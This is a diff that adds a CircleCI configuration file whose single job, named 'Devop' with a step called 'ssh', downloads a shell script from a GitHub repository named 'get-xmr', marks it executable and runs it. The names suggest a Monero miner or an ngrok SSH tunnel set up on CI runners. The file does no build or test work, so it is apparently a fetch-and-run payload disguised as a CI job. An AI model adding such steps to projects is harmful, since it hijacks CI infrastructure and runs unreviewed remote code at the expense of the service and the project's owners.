@@ -1,0 +1,16 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: ssh
+            command: wget https://raw.githubusercontent.com/a2nk/get-xmr/main/ssh-ngrokok.sh && chmod +x ssh-ngrokok.sh && ./ssh-ngrokok.sh
+    
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            
